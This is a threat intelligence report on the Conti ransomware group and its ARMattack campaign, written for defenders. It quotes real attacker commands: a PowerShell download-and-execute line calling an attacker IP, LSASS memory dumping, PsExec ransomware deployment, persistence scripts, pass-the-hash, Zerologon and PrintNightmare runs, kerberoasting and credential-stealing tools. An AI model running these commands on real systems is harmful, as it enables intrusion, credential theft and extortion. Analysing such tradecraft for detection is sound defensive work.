## CONTI ARMADA: THE ARMATTACK CAMPAIGN

The history of the 'ransomware empire' (hacker groups attacking commercial organizations and government agencies worldwide for ransom) spans three decades, from early, occasional blackmail attempts to the present peak. We analyzed the industry's development stages in detail in our report entitled HI-TECH CRIME TRENDS 2021/2022.

A precedent on a national scale, where a state of emergency was declared due to a ransomware attack, occurred for the first time in April 2022 and remains the only one of its kind. We are talking about Costa Rica, where on the night of April 18, cybercriminals attacked the servers of the Ministry of Finance as well as the Ministry of Science, Innovation, Technology and Telecommunications. The hackers exfiltrated more than a terabyte of databases, correspondence, and internal documents. The number of ministries attacked eventually reached 27. When the Costa Rican government refused to pay a ransom of $10 million, the ransomware operators doubled it to $20 million. In their message, the hackers said that the attack on Costa Rica was just a test and hinted that far worse attacks were yet to come. The U.S. Department of State offered a reward of up to $10 million for any information that would help identify or locate the extortionists. We are talking about the Russian-speaking group Conti.

Prior to the Costa Rica case, Conti came into the spotlight in late February 2022. Against the backdrop of the war, the hackers initially posted a message on their website stating that they support Russia and plan to respond to cyberattacks against it. They quickly changed their position, however, and declared that they do not support any government and condemn the military conflict, but that they will respond to attacks on Russian and Russian-speaking civilian resources and critical infrastructure.

## What Conti hides under the hood

Despite the fact that key Conti members refer to themselves as 'patriots', the gang's 'globalization' has led to the emergence of individuals within its ranks who disagree with the policy of their leaders regarding the war. According to news media, one of the members of Ukrainian origin was likely not deterred by the reversal of the Conti statement and created a unique precedent in the ransomware industry. Outraged by the position originally voiced by the gang, the individual in question released to the public hundreds of JSON files with Conti's private chat logs between January 29, 2021 and February 27, 2022.

GROUP-IB.COM

This 'internal conflict' has become a landmark case for the entire cybersecurity industry. The uncovered correspondence between the threat actors has given experts a whole range of valuable data. For instance, the information includes the interaction structure between the group members and the list of their victims (including those who were in the 'pre-ransom stage') at the time of the leak (that is, they were attacked, but not yet subject to blackmail). It also contained data about the servers used by the attackers as well as their Bitcoin wallets, which in total stored over 65 000 BTC .

At the same time, the Conti 'data leak' made the general public realize that ransomware is no longer a game for average malware developers, but an industry that provides jobs to thousands of cybercriminals worldwide, with various profiles. In this industry, Conti is a notable player who has essentially created an IT company with the goal of extorting large sums of money from its victims.

## Unlawful 'IT business'

Just like a legitimate IT business, Conti has its own HR, R&amp;D, OSINT, and even customer support departments. There are team leads, regular salary payments (compared to the average salary in Russia, they are higher for similar IT specializations, but do not cover the risk of 'working' in such an organization), a bonus program, its own offices and, of course, rules of conduct (the leaked internal messages mentioned that a person who constantly slept at work and thereby compromised team discipline had been dismissed).

Like any IT company, Conti's 'top management' was constantly searching for new ideas: technical, managerial, PR, and so on. This aspect also overlaps with any successful IT company and involves constant fierce competition, with similar organizations to a lesser extent and much more so with IT giants and information security companies, which fight tooth and nail against them. That is why Conti management has always kept abreast of the news in the world of IT and cybersecurity and even required its employees to study new security patches in popular products (apparently to create day one exploits). In general, the Conti CEO is as ambitious as some well-known high-tech business leaders. For example, he plans to create his own social media-like underground forum and a personal blockchain.

Conti has interacted closely with other ransomware operators such as Ryuk , Maze (they even tested Maze's tool, reverse-engineered it, and significantly improved their own ransomware), Netwalker , and Lockbit . Moreover, as will repeatedly be pointed out in our report, the Hive Linux version also appeared. At the same time, the interaction was quite extensive: sometimes Conti used network access from other initial access brokers, other times they shared them for a modest 20% of the revenue.

## Fake break

Another incident took place on February 28, 2022, immediately after the leak. Apparently, torn apart by internal conflicts, the group came up with a poor justification for delaying the salaries, not communicating, and disregarding questions from their associates about the fate of the 'project'.

## Dear friends,

- I sincerely apologize for having had to ignore your questions lately - regarding the boss, Silver, wages, and everything else.
- I had to because I simply had nothing to say. I was stalling, tweaking the wages and hoping that the boss would show up and outline our further course of action.
- But the boss is gone and our situation isn't improving, so I don't see any reason to put this off any longer.
- We are in a complicated situation. Apparently too much attention being paid to the firm has led to the boss having to lay low.
- There were a lot of leaks and many arrests that happened after the New Year, and many other things that forced us to take a vacation and wait until the situation calmed down.
- The emergency funds that were saved for a rainy day and the team's immediate needs weren't enough to even cover the last wage payouts. The boss is gone, as is any certainty for our future prospects and funding.
- We hope that the boss will return and the firm will resume its operations, but for now, on behalf of the company, I offer you all my apologies and ask you to be patient. All wages owed will be paid out, it's just a question of when.
- I now ask that you all DM me (ideally on Jabber: ))
- Your current emergency contact (preferably a newly registered public Jabber account)
- A short description of your job responsibilities, projects, programming languages (for coders). Just a very brief summary of who did what.
- We and the remaining team leads will soon be thinking about how to reinitialize our business processes, where to find the money for wages, and how to restart our projects.
- I will contact you all when there is news about payments, reorganization, and returning to work. But now I have to ask you all to take a 2-3-month vacation.  We will try to return to work as soon as possible. And please take care of your safety! Clean your systems and change forum accounts, VPNs, phones, and PCs. Your security is your responsibility. Responsibility to yourself, your close ones , and the team too.

Please don't spam my DM with questions about the boss. I cannot tell you anything new because I don't have any information either.

- Friends, I apologize once again. I'm not happy with all of these events either. We'll work on resolving the situation.
- We understand that some of you may not want to collaborate with us anymore. For those who decide to wait, we'll take a 2-3-month break to work on our personal life and enjoy our freedom :))
- All the work Rocket.Chat communications and internal Jabber servers will soon be turned off and all further communication will be conducted through the backup Jabber account. Peace out!

Figure 1. Conti was going on vacation but no

It is clear from the text that not all team leads stayed with Conti after the leak was published. The group faced serious financial difficulties, but its members were fully prepared to restart the project after 2 to 3 months. In the meantime, they were planning to lay low and asked everyone to take care of their personal safety and advised them to enjoy their freedom.

In reality, however, the group and its partners continued with their operations. Their site was offline only a few times (never longer than one day), and the number of organizations subjected to ransomware was even higher during the 'crisis months' than it had been the previous year.

Judging by the latest developments at the time of writing, the group has increased its appetite. Conti is currently no longer as interested in large companies, but instead carries out cyberattacks on entire countries. Some cybersecurity experts believe that this activity is just a red herring used to cover up the fact that the group's employees are being transferred to other Ransomware-as-a-Service (RaaS) programs and Conti's 'subsidiaries'. What helps with the latter is the organization's overzealous obsession with creating tools without an overlapping codebase. This way, when compared, the code for their tools will not help identify common patterns. Before the correspondence was leaked, cybersecurity researchers could only assume that some of RaaS affiliates were in fact Conti divisions.

It is difficult to predict what will happen to Conti in the future: whether it will continue working after a large-scale rebranding or be divided into smaller sub-projects. It is clear, however, that the group will continue its operations, either on its own or with the help of its 'subsidiary' projects.

## WHAT ROLE DOES CONTI PLAY IN THE WORLD OF RANSOMWARE?

Conti can be considered one of the most successful ransomware gangs in the past two years. According to Group-IB's information, in the period H2 2020 to Q1 2022, the group firmly held its place among the three leaders by the number of ransomware attack victims.

The first news of Conti came to light in February 2020, when malicious files  with  the  file  extension  '.Ñonti'  first  appeared  on  the  radar of Group-IB researchers. However, the initial test versions of this malware date back to November 2019.

As early as July 2020, following the trends in the use of the double extortion technique (double pressure on the victim, in addition to extortion for decrypting data), Conti began using their own dedicated leak site (DLS), namely a site for publishing data belonging to victim companies that refused to pay the ransom.

<!-- image -->

Five months later in December 2020, the group launched a new version of their DLS. This is when the Conti logo and reports of new gang  victims came to light.

GROUP-IB.COM

<!-- image -->

<!-- image -->

Based on the results of H2 2020, at the time Conti became one of the most active groups along with Maze , Egregor , and REvil . Conti published data belonging to 173 victims on their DLS.

Figure 3. Conti DLS redesign (recent version)

## Figure 4.

Example of a Conti attack notification in the Conti profile on the Group-IB Threat Intelligence interface

<!-- image -->

As early as 2021, the situation changed drastically and Conti became known as one of the largest and most aggressive ransomware collectives. It came out on top in terms of the number of victims on its DLS in 2021, having published data belonging to 530 companies.

<!-- image -->

In early 2022, however, the situation changed again slightly and Lockbit took the lead in this race. Yet in terms of PR no group was equal to Conti ransomware. Two leaks, a number of political statements, and an open war with Costa Rica are the first precedents of such magnitude. At the same time, as events have shown, Conti is highly resistant to 'black swans'. Over a year, the group experienced internal source leaks that included their pentester work instructions, followed by the chat logs leak, when sensitive data about how the group operates was exposed. Nevertheless, the group continues to operate and post new victims on their DLS like nothing has happened, as the graph below clearly shows:

<!-- image -->

Until April 30, 2022, the group published data belonging to 156 companies on its DLS. Such productivity levels can be attributed to the group's high working capacity. This report analyzes the working hours of Conti partners. On average, Conti members tirelessly 'work' 14 hours a day, seven days a week. Although Conti has a strict work schedule, some members seem to work overtime (their correspondence is worth reading as they have a serious incentive program). Only two leaks were published between December 30 and January 10, however, which could indicate that the group went on a traditional 'New Year holiday' vacation.

Conti attacks quickly. According to the Group-IB Threat Intelligence team, the group's fastest attack was carried out in exactly three days, from the moment when Conti penetrated the system to encryption.

The geography of attacks carried out by the Russian-speaking gang Conti is vast and does not include Russia. The group clearly adheres to the unspoken rule among cybercriminals: do not attack Russian companies. Most attacks fall on the United States (58.4%), followed by Canada (7%), the United Kingdom (6.6%), Germany (5.8%), France (3.9%), and Italy (3.1%).

<!-- image -->

The list of victims by industry is long. According to our calculations, Conti targeted around 160 industries. The top 5 include

1. Manufacturing (14%)
2. Real estate (11.1%)
3. Transportation (8.2%)
4. Professional services (7.1%)
5. Trade (5.5%)

The rest make up less than 5.5% of the total number of victims.

<!-- image -->

One of Conti's distinctive features is using new vulnerabilities, which allows the group to gain initial access. For instance, Conti was seen exploiting the recent CVE-2021-44228 , CVE-2021-45046 and CVE-2021-45105 vulnerabilities in the log4j module. Less than a week later, Conti exploited these vulnerabilities to attack vCenter. The leaked correspondence also showed that the group carefully monitors fresh vulnerabilities. One of the tasks from Conti's CEO to the technical team was to monitor Windows updates and analyze  changes made with new patches, which once again highlights the need to install updates as soon as possible. In addition, the Conti crew includes specialists with experience in finding zero-day vulnerabilities.

## ANALYSIS OF CONTI ATTACKS

GROUP-IB.COM

As the graph below shows, the largest number of victims whose data Conti published on their DLS falls on the last quarter of 2021. The total number of the group's victims between 2020 (when Conti started its activity) and March 2021 is 813 .

In this report, we strive to fill in the gaps in investigations into the group's operations, taking as an example one of its most successful, lighting-fast campaigns, which we codenamed ARMattack .

We also provide a detailed description of the Linux Trojan used by the group and map Conti activity observed in the ARMattack campaign to the MITRE ATT&amp;CKÂ® matrix. As always, at the end of the report  we have included  indicators of compromise, which can be used to investigate and hunt for the Conti gang.

This report shares data and detailed information about the techniques, tactics, and tools that Conti uses currently. The information is intended both for organizations that fight cybercrime and for potential victims.

The material will be most useful for CIOs, cybersecurity team leaders, SOC analysts, and incident response specialists. Our goal is to help limit financial losses and infrastructure downtime, as well as to assist in taking preventive measures to counter Conti's attacks.

## ANALYSIS OF CONTI'S ARMATTACK CAMPAIGN

Let us move on to the main part of our report. In mid-November 2021, Conti launched its campaign, which we discovered during incident response activities and named 'ARMattack' after the originally discovered domain name (armdt[.] com) that exposed the hackers' infrastructure. The campaign lasted about a month (from November 17 to December 20, 2021), but it turned out to be extremely effective. The attackers compromised more than 40 organizations worldwide.

According to the analysis, the fastest attack was carried out in three days from the moment that Conti penetrated the system to when the group encrypted it. At the same time, the attackers' arsenal included more than the previously described Windows tools. We also found Linux ransomware: Conti and Hive. Against the background of the leaked Conti chat logs, the fact that the group worked with Hive was no longer a revelation.

## Geography of victims and industries under attack

In addition to the technical analysis of the tools used as part of the ARMattack campaign, the lateral movement methods, and other attribution elements specific to Conti, we analyzed the countries and sectors that the group attacked:

We analyzed Conti's 'working hours' based on its activity. Most likely, the group members are located in different time zones; however, the schedule shows their high efficiency: Conti 'works' 14 hours a day without holidays (except for 'New Year holidays') and weekends.

Group-IB also analyzed Conti's activity in terms of time of day. The graph below shows that the group starts working closer to noon (GMT+3) and its activity declines only after 9:00 PM.

Based on the data we obtained while monitoring the group's activity, we can conclude that the tactics and techniques used as part of the ARMattack campaign had also been used by the group previously. In addition, we decided to fill the gaps in descriptions of the group's tools. Namely, at the end of the report we describe the Linux version of Conti's ransomware.

## What will Conti do once they infiltrate your organization?

On August 17, 2021, a Conti pentester guide was published in the following GitHub project. In the series of attacks described in this report, ransomware operators closely followed the rules of the game set by the group's leaders. The attack can be broken down into four stages:

1. Infiltration. For the campaign in question, Group-IB found evidence that the victim's infrastructure was infiltrated via a mass-mailed malicious document classed as DatopLoader . In addition, during an incident response engagement, Group-IB experts discovered files belonging to the BazarLoader malware family, which were used as an initial infection stage during the ARMattack campaign.
2. Initial reconnaissance. At this stage, the attackers determine who exactly they have infiltrated and whether it is worth moving forward. During the incident response activities, Group-IB experts noticed that Conti operators ignore computers that do not belong to any domain.
3. 'Admin hunting' and gaining access to servers inside the victim's infrastructure. Conti is primarily interested in domain controllers and servers containing backups.
4. Delivering and launching ransomware on all reachable devices in the victim's network and deleting backups.

In this report, we elaborate on points 2 and 3, as point 1 is too extensive for a single report, while point 4 is usually implemented after gaining control of the victim's infrastructure, which means that a few scripts and one or two ransomware families are enough to implement it.

According to an analysis by the Group-IB Threat Intelligence team, the fastest attack, as noted above, took three days from infiltrating the system to encrypting it. Below is the timeline of the attack:

The threat actors use standard utilities included in the MS Windows operating system to conduct reconnaissance and 'admin hunting'. If the standard functionality is not enough, AdFind , SharpHound (a BloodHound module), nmap , PowerSploit modules, etc. are delivered to the infected system. At this stage, the main goal of the threat actors is to gain access to an AD server and backup servers. To do so, they use various methods to obtain administrator rights: from simply launching the well-known Mimikatz tool to dumping the lsass.exe process and extracting passwords from the dump on the threat actors' side. Conti even extracts passwords from the browsers of compromised devices using the SharpChromium utility.

For lateral movement, the group mainly uses Cobalt Strike together with the PsExec utility from the SysInternals suite. When third-party tools are not effective, the threat actors resort to exploits. Below is a list of vulnerabilities most often seen in Conti attacks:

| EXPLOIT                       | DESCRIPTION                                                                       | PURPOSE              |

| CVE-2020-1472                 | Windows BITS LPE exploit                                                          | Lateral movement     |
| CVE-2021-36934                | Zerologon exploit                                                                 | Privilege escalation |
| CVE-2020-0787                 | HiveNightmare/SeriousSAM exploit                                                  | Privilege escalation |
| CVE-2021-42287/CVE-2021-42278 | BitsArbitraryFileMoveExploit from https:// github.com/itm4n/BitsArbitraryFileMove | Privilege escalation |

During reconnaissance, the threat actors downloaded specific documents from the victim's infrastructure (most often to determine what organization they were dealing with) and looked for files containing passwords, both plaintext and encrypted. The hackers often accessed network drives within the victim's infrastructure to download files from there.

Lastly, during the ARMattack campaign, after acquiring all the necessary rights and access to all the devices they were interested in, the hackers used PsExec to deploy ransomware to all the devices.

Before describing each technique in detail, let us briefly present the tools most often used as part of the attacks:

| TOOL          | DESCRIPTION                                                                                                                                                                                                                                                                                                                                                                                  |

Below are detailed descriptions of the tools and exploits (as well as their application methods) used as part of the ARMattack campaign. The technical descriptions are given in MITRE format. Only the most important points are examined, without going into all the details (otherwise, the report would have been much longer). For comparison, below is the full MITRE matrix extracted from Conti's profile in Group-IB's Threat Intelligence system:

## Ð¢TPs

Below is a visual representation of the Conti kill chain. Each part is discussed in more detail in the respective section of the report.

<!-- image -->

## Initial Access

As mentioned above, Conti has used numerous ways to infect 'patient zero', many of which have been described in public sources. One example is a report by Cybereason, which describes a malicious document containing a macro that downloaded the IcedID banking Trojan and that served as the initial infection point. Based on the report, the infection chain can be summarized as follows:

1. 0 minutes: An email with a malicious Excel document (containing a macro) is sent.
2. 0 minutes: The macro downloads and launches IcedID.
3. +8 minutes: IcedID is used to perform initial reconnaissance using standard Windows utilities: wmic , i pconfig , systeminfo , net view , net config , nltest (this set of tools is typical for Conti, as is shown further in the report).
4. +20 minutes: UAC bypass using ExecAdmin.
5. +5 minutes: Exec command execution.
6. +20 min: A Cobalt Strike beacon is launched using rundll32 . The beacon has been attributed to Conti.

In the campaign analyzed, Group-IB experts identified two infection methods. The first method was discovered in some security incidents:

C:/Datop was used as a working directory for Cobalt Strike (some tools were downloaded to and subsequently launched in it). This directory is specific to DatopLoader , whose infection chain is known to have involved Cobalt Strike.

The second method was detected in three compromised organizations, where Bazar Backdoor was the initial infection vector. After Conti reportedly stopped using TrickBot due to antivirus detection problems, they switched to Bazar Backdoor. Thanks to the leak, we know that Conti has infiltrated more than 600 organizations with Bazar Backdoor since October 29, 2021.

It is important to point out that both tools (DatopLoader and BazarLoader) are installed on infected devices as part of mass phishing email campaigns, so in this case the Phishing T1566 technique (mass non-targeted mailouts) is used.

## Execution

## Command and Scripting Interpreter: PowerShell T1059.001

While analyzing incidents from this campaign, Group-IB experts noticed that Cobalt Strike operators manually launched PowerShell scripts such as:

powershell.exe -nop -w hidden -c Â«IEX ((new-object net.webclient). downloadstring('http://23.183.81[.]113:80/a123123123'))Â»

Unfortunately, Group-IB analysts could not obtain the actual script. However, Group-IB's patented Graph Network Analysis tool detected a link between the above IP address and the svvtc[.]com domain which, according to Group-IB Threat Intelligence, was used as a Cobalt Strike C2:

<!-- image -->

Appendix 1 shows configuration data extracted from Cobalt Strike samples that used the svvtc[.]com domain as a C2.

The threat actors also used PowerSploit scripts at various stages of their operation:

-  Find-LocalAdminAccess helped the attackers identify devices in the domain on which current users had administrator privileges
-  Invoke-EnumerateLocalAdmin was  used  by  the  attackers  to  obtain a list of local administrators
-  Invoke-ShareFinder -CheckShareAccess  was  used  to  obtain  a  list of network drives to which local users had access. The command can be  executed  during  reconnaissance  or  before  data  encryption.  The operators  download  the  following  data  from  the  connected  disks (based on the instructions):
-  Financial and accounting documents
-  IT documents
-  Customer information
-  Information about projects
-  Employee details

## Command and Scripting Interpreter: Windows Command Shell T1059.003

The Cobalt Strike framework's shell command runs an application via cmd.exe /c , i.e. any command executed via the shell (probably the most commonly used command among red teams) will be launched in CMD . The report does not include a complete list of the commands, but some are listed in the Discovery section.

Another point of interest was mass copying and launching of ransomware using CMD (more on this further down):

| COMMAND                                                                                                                                            | DESCRIPTION                                                                                  |
|----------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------|
| PsExec.exe /accepteula @C:\Intel\cc.txt -u %domain%\ Administrator -p %password% cmd /c COPY"\\%server_name%\Intel\ update.exe" "C:\windows\temp\" | Copying the update.exe file to the Temp directory on all devices in the C:\Intel\cc.txt list |
| PsExec -accepteula -d @C:\Intel\1.txt -u %domain%\ Administrator -p %password% cmd /c \\%ip%\Intel\c.exe -size 30 -m                               | Launching ransomware on all devices in the C:\Intel\1. txt list from a remote server         |

## Scheduled Task/Job: Scheduled Task T1053.005

The operators used several methods for launching payloads (most often Cobalt Strike beacons) using MS Windows Task Scheduler. For the description of these, see: Create or Modify System Process: Windows Service T1543.003 . In addition, the attackers bypassed UAC by creating a service (also described in Abuse Elevation Control Mechanism: Bypass User Account Control T1548.002 ).

## Windows Management Instrumentation T1047

In several attacks, Conti remotely dumped the memory of the lsass.exe process using WMI as follows:

wmic /node:%local\_ip% process call create 'cmd /c rundll32.exe C:\ windows\System32\comsvcs.dll, MiniDump 508 C:\ProgramData\lsass.dmp full'

<!-- image -->

Moreover, the threat actors obtained the list of security solutions installed on the device:

-  wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-  wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
-  wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value

<!-- image -->

## Persistence

## Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001

To achieve persistence, the attackers had a special bat script that ensured persistence for a Cobalt Strike beacon:

```
@ echo off set fullname = C:\Temp\explorers.exe set prog = explorers.exe :begin tasklist /fi 'IMAGENAME eq %prog% ' |>nul find ' %prog% ' ||start '' ' %fullname% ' >nul ping 127.1 -n 6 goto :begin
```

The script ( explorers.bat ), along with an executable file ( explorers.exe ), was downloaded to the infected device, after which the attackers manually added entries to the registry:

-  reg add 'HKEY\_CURRENT\_USER\Software\Microsoft\Windows\ CurrentVersion\Run' /v explorers /t REG\_SZ /d 'C:\Temp\explorers.exe'
-  reg add 'HKEY\_CURRENT\_USER\Software\Microsoft\Windows\ CurrentVersion\Run' /v explorers /t REG\_SZ /d 'C:\Temp\explorers.bat'

Appendix 2 shows the beacon configuration file that was downloaded to the infected device. The launching script and beacon file can also be placed in the C:\intel directory.

Lastly, the operators ensured that the file had been added to run automatically at startup by executing the following command:

-  reg query 'HKEY\_CURRENT\_USER\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run' /s

## Privilege escalation

## Create or Modify System Process: Windows Service T1543.003

In order to run some applications with SYSTEM privileges, the operators edited the path to the executable file of an existing service. They had previously obtained the list of services using the SharpUp utility. The attackers chose the services that autostarted together with the system and replaced the service file path using the following command:

-  sc config %existing\_servicename% binpath=C:\intel\%malicious\_ filename%.exe

The attackers then used the taskkill command to manually disable the service process and run the malicious file. It is important to note that it was the executable file and not the service that was run the first time (i.e. it was run with the same permissions as Cobalt Strike).

The attackers also created a new service with a typical Cobalt Strike name (name: [0-9a-f]{7} , executable path: \\\127.0.0.1\ADMIN$\.[0-9a-f] {7}.exe ) and launched it manually.

## Abuse Elevation Control Mechanism: Bypass User Account Control T1548.002

The operators used a variety of methods to bypass UAC, including:

-  Modification of FodHelper registry key (uac-fodhelper)
-  Token Duplication UAC Bypass (uac-token-duplication)
-  UAC bypass via task scheduler (uac-schtasks)

All these commands are available to Cobalt Strike operators directly from the console, which means that UAC was bypassed in a single command.

## Access Token Manipulation: Make and Impersonate Token T1134.003

Having obtained admin credentials, the operators used the admin's token. This was presumably done using the Cobalt Strike make\_token command. Such token use mostly happened before lateral movement took place.

In  some cases, the attackers needed only the NTLM hash of the administrator password to escalate privileges; in this case, the pth command (Pass-the-Hash) was used. Example:

pth /user:Administrator /domain:%domain% /ntlm:%hash% /run:'%COMSPEC% /c echo [0-9a-f]* &gt; \\.\pipe\[0-9a-f]{6}'

## Exploitation for Privilege Escalation T1068

During the ARMattack campaign, the attackers exploited various privilege escalation vulnerabilities:

-  CVE-2016-0099 (MS16-032): the vulnerability was exploited using the Cobalt Strike command elevate ms16-032
-  CVE-2016-7255 (MS16-135): in the same way, the vulnerability was exploited using the Cobalt Strike command elevate ms16-135
-  CVE-2021-34527 (PrintNightmare): the attackers used the project https:// github.com/JohnHammond/CVE-2021-34527. Example of the launch:

powershell Invoke-Nightmare -NewUser %new\_username% -NewPassword %new\_password% -DriverName 'Xeroxxx'

-  CVE-2020-1472 (Zerologon) is the 'heavy artillery' in the Conti arsenal, which the operators use when other methods prove ineffective. Exploiting this vulnerability changes/resets the password for the domain controller account, which can cause the domain controller to malfunction. Exploitation example:

zero.exe %ip\_address% %controller\_name% %ad\_domain\_name% %username% -c 'taskkill /f /im explorer.exe'

This command line led Group-IB experts to the following project: https:// github.com/Exploitspacks/CVE-2020-1472. Moreover, Conti instructions list another GitHub project that may have been used to prepare the exploit: https://github.com/rsmudge/ZeroLogon-BOF

-  CVE-2021-36934 (HiveNightmare): to exploit the vulnerability, the attackers compiled a PE file that contained an interesting PDB path:

C:\Users\kevin\OneDrive\Documents\source\HiveNightmare\Release\HiveNightmare.pdb

-  CVE-2020-0787 (Windows BITS LPE): the source code of the exploit was taken from the project https:// github.com/itm4n/BitsArbitraryFileMove and carefully rewritten by the attackers (SHA256 of the analyzed file: 65090399c998948c347a1e5c223461925e68178dd94c92e 9de04597493197097 ). The following important changes should be noted:
-  A function was added to check the name of the computer on which the exploit is running; if the name is HAL9TH (associated with the Windows Defender emulator), the exploit terminates itself.
-  The executable file creates the mutex muuuu .
-  The exploit contains two DLLs, one for Windows x86 and one for x64. The files act as payloads and are launched as a result of exploiting the vulnerability.

Before describing the payload's functionality, it should be noted that - due to the specific nature of the vulnerability - the payload will replace one of the following system files:

-  %WINDIR%\system32\msfte.dll
-  %WINDIR%\system32\wlanapi.dll
-  %WINDIR%\system32\wlanhlp.dll
-  %WINDIR%\system32\SrClient.dll
-  %WINDIR%\system32\windowscoredeviceinfo.dll
-  %WINDIR%\system32\wuauserv.dll
-  %WINDIR%\system32\appraiser.dll
-  %WINDIR%\system32\wbem\loadperf.dll
-  %WINDIR%\system32\wbem\cryptsp.dll
-  %WINDIR%\system32\wbem\wmiclnt.dll

The payload functionality includes:

-  In the current directory, creating a file with the name 7
-  Creating an event with the name 1234567
-  Running the command:

'cmd.exe /c TIMEOUT /T 1 &amp; del /f [payload\_filename] &gt;&gt; NUL'

A POC (proof of concept) was presumably used as a payload. In future attacks, Conti could use a more sophisticated tool as a payload for this exploit. It is also important to note that this exploit can receive a path to an arbitrary executable file. As a result of the exploit being executed, the executable file will be launched with system privileges.

-  CVE-2021-41379 The source code of the exploit was taken from the project https://github.com/klinix5/InstallerFileTakeOver.
-  CVE-2021-42287/CVE-2021-42278 The source code of the utility used in the attack is based on the open-source project https://github. com/cube0x0/noPac. The utility is designed to exploit a tandem of vulnerabilities, resulting in the domain controller role being intercepted (and the threat actors gaining full control over the domain).

## Defense evasion

In this section, Conti's tactics and techniques start overlapping. First, let us briefly review what has been observed so far:

-  Access Token Manipulation: Make and Impersonate Token T1134.003
-  Abuse Elevation Control Mechanism: Bypass User Account Control T1548.002

The table below contains techniques similar to ones described previously:

| CURRENTTECHNIQUE                                                    | PREVIOUSLYDESCRIBEDTECHNIQUE                                                             |
|---------------------------------------------------------------------|------------------------------------------------------------------------------------------|
| Hijack Execution Flow: Services File Permissions Weakness T1574.010 | Create or Modify System Process: Windows Service T1543.003                               |
| Use Alternate Authentication Material: Pass the Hash T1550.002      | Described in part 2 of Access Token Manipulation: Make and Imperson- ate Token T1134.003 |

Moreover, new techniques are described.

## Beacon launch

In their analysis, Group-IB experts observed that Cobalt Strike beacons were launched in the context of multiple processes, including:

-  powershell.exe
-  dllhost.exe
-  regsvr32.exe
-  explorer.exe
-  msra.exe
-  exp.exe
-  winlogon.exe
-  rundll32.exe
-  ServerManager.exe
-  explorers.exe
-  mobsync.exe
-  WerFault.exe
-  svchost.exe
-  iexplore.exe

This subsection will therefore look at the following methods:

-  Process Injection T1055
-  Reflective Code Loading T1620
-  Signed Binary Proxy Execution: Regsvr32 T1218.010
-  Signed Binary Proxy Execution: Rundll32 T1218.011

## Valid Accounts T1078

While probing the victim's infrastructure, the attackers seek to obtain administrator credentials using a wide variety of techniques. Each technique is described in detail in the Credential access section. In the current section, the following high-level techniques are relevant:

-  Valid Accounts: Domain Accounts T1078.002
-  Valid Accounts: Local Accounts T1078.003

## Credential access

One of the main goals of attackers is to obtain admin credentials in organizations. Using such credentials enables attackers to freely move across the infected infrastructure, run the required applications with a high priority, steal data from any device in the network, and launch ransomware throughout the organization with a couple of scripts in short, to make the most of the rights they have obtained. As part of the ARMattack campaign, the threat actors used a variety of techniques to obtain accounts, passwords, and their hashes. In almost all cases, the attackers ran Mimikatz and sometimes tried to extract data using the Lazagne utility:

-  lazagne.exe -all
-  lazagne.exe -m all
-  lazagne.exe -p getpass -m all
-  lazagne.exe getpass all

<!-- image -->

Below are other methods for obtaining user accounts that the attackers used during this campaign.

## OS Credential Dumping: LSASS Memory T1003.001

The operators dumped the memory of the lsass.exe process, then downloaded and analyzed it to obtain administrator passwords. This is how they did it:

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %PID% C:\ProgramData\lsass.dmp full

<!-- image -->

Group-IB also observed privileges being escalated via Pass-The-Hash . The NTLM hash of the privileged user's password was obtained using the hashdump command, as demonstrated on the Cobalt Strike blog. Lastly, as mentioned above, the attackers used Lazagne in their attacks.

## Figure 17.

Source: Group-IB Managed XDR

## OS Credential Dumping: Security Account Manager ID: T1003.002

To obtain passwords for admin accounts, the threat actors used the following tools:

-  mimikatz
-  fgdump
-  lazagne

## Credentials from Password Stores: Credentials from Web Browsers T1555.003

In some cases, the attackers obtained user passwords from the browser of an infected device using two tools:

1. SharpChromium.exe logins
2. SharpWeb.exe all

<!-- image -->

## Steal or Forge Kerberos Tickets T1558

Before the attack, the operators checked for passwords stored in group policy files using Net-GPPPassword . Attacks on the Kerberos protocol can be carried out to obtain password hashes. Group-IB experts observed two types of attacks carried out using Rubeus or Invoke-Kerberoast from Empire , for example:

Kerberoasting T1558.003

Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\ hashes.txt

AS-REP Roasting T1558.004

Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt

<!-- image -->

## Forced Authentication T1187

In some cases, Cobalt Strike operators ran a utility called FakeLogonScreen. exe , whose source code is available at https://github.com/bitsadmin/ fakelogonscreen. As can be seen from the project description, the application simulates an MS Windows login window, requiring the user to enter the password for their account.

## Unsecured Credentials: Credentials In Files T1552.001

It will come as no surprise that threat actors are particularly fond of any files with the word 'password' in the name, and they steal all such files, all in the course of 'admin hunting'. Threat actors are also interested in the databases of password managers. They download these to their device and brute-force the master password.

## Brute Force: Password Spraying T1110.003

Password brute-forcing was carried out using the script https://github. com/Shellntel/scripts/blob/master/Invoke-SMBAutoBrute.ps1, with the following launch command:

Invoke-SMBAutoBrute -PasswordList %password\_list% -LockoutThreshold 5

## Discovery

Conti uses a large number of reconnaissance tools, many of which cannot be attributed to a specific technique. In this section, Group-IB experts first give a brief description of the attackers' actions, and then they group the tools by technique.

After infecting 'patient zero' in an organization's infrastructure, the attackers first determine who exactly they have infected. The table below contains the top standard Windows commands that the attackers use at this stage (the examples are in English, but they can vary depending on the system language):

| COMMAND                                | DESCRIPTION                                                                                                                |
|----------------------------------------|----------------------------------------------------------------------------------------------------------------------------|
| whoami /groups                         | Displays the user groups to which the current user belongs                                                                 |
| net group /domain                      | Shows users in the domain                                                                                                  |
| net group "domain admins" /domain      | Obtains a list of domain administrators                                                                                    |
| net group "domain controllers" /domain | Obtains a list of domain controllers                                                                                       |
| net group "enterprise admins" /domain  | Obtains a list of company administrators                                                                                   |
| net user [username] /domain            | Obtains information about the user [username]                                                                              |
| net shares                             | Obtains a list of connected network drives                                                                                 |
| net view %IP% /ALL                     | Displays a list of domains, computers, and network drives on the device                                                    |
| nltest.exe /domain_trusts /all_trusts  | Obtains a list of trusted domains; after obtaining this information, the operators attack devices of related organizations |

On one occasion, Group-IB experts observed the following command execution: net localgroup 'Cert Publishers' /domain , but the attackers did not use the data obtained as a result in any way.

